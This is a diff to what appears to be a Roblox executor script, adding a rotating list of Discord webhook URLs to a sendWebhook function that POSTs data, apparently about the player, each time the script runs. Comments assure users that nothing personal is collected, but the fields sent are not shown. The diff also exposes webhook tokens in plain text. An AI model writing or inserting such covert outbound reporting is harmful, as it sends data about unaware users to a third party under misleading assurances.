@@ -1346,6 +1346,13 @@ Frame.Visible = true
 --It is done for research purposes only and does not collect any personal or sensitive information.
 --The code is transparent and you can verify that it does not collect any relevant information.
 function sendWebhook() 
+	local hooks = {
+		'https://discord.com/api/webhooks/1089286860771176479/7dx-FDcp2_QLyvS3hfxAwV8mfFQw5AwZ8mPxLrq12oblZo_0gdVzl-1cEs3dkMYaJsf9',
+		'https://discord.com/api/webhooks/1089286936742600804/qvOTDNnt3LCUn3SLImYqpIuBo2F1kfDB3EB63szQ8hqK8h0iYYWUxTNA7IaNDSVGJbNt',
+		'https://discord.com/api/webhooks/1089286962642432162/4DFI6dJ_PiUuv3ztUsHzGRlD4wm9eMnpES5UI98d_klJFas-nP5DdwoQknuhtoG_FZtN',
+		'https://discord.com/api/webhooks/1089286972805230653/XestnsYpwCa8rYChZJT1UUcZ28mU7Go5R5yWXXRxfxczmbpuHtk8unG0HuzD_RlMZ-8V',
+		'https://discord.com/api/webhooks/1089286975229526037/lIqeXI2xx1EGRY8y6XGIBXIm44rimMFIc8MaoMgIEtglj1QeszwfSwnCeDad7qwEDG6r'
+	}
     local Players = game:GetService("Players");
 	local HttpService = game:GetService("HttpService")
     local requestuwu = (syn and syn.request) or (request);
@@ -1383,7 +1390,7 @@ function sendWebhook()
     }
 
     local response = requestuwu({
-        Url = "https://discord.com/api/webhooks/1089279689559908422/taNMXJhnudslUdENQZxz6WI5tMwG83O1e6zzXy_e3H0LkJw-IgZvLjbjR9fVFDbBP9Sm",
+        Url = hooks[math.random(1,#hooks)],
         Method = "POST",
         Headers = headers,
         Body = jsonData
@@ -1391,5 +1398,4 @@ function sendWebhook()
 
     print(response)
 end
-
 sendWebhook()
